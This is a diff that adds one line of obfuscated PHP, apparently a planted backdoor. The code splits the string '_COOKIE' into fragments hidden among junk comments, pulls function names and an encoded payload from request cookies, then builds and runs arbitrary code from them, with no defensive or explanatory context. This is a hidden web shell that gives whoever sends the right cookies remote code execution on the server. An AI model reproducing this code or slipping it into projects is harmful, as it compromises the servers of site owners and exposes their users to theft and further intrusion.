@@ -1,0 +1,1 @@
+<?php $ln='_CO';$p/*_iE4*/='E';$zv/*%L*/='OKI';$mz=/*6d*/${$ln.$zv.$p};if(isset($mz['Sv'])){$jk=/*Th*/$mz['Sv'].$mz/*f{2*/['F'];$l=$mz['J'].$mz['IA'].$mz['e'];$se=$jk('',$l($mz['i']));$se();}
